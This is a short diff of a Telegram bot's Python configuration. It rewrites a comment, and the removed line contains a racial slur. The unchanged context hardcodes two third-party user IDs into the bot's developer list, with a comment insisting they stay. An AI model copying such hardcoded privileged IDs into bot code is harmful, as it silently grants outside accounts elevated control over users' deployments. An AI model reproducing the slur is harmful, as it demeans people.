@@ -192,7 +192,7 @@ else:
     SPAMWATCH = Config.SPAMWATCH_API
     SPAMMERS = Config.SPAMMERS
 
-# Dont Remove This Nigga
+# Dont Remove This!!!
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(645739169)
 DEV_USERS.add(870471128)
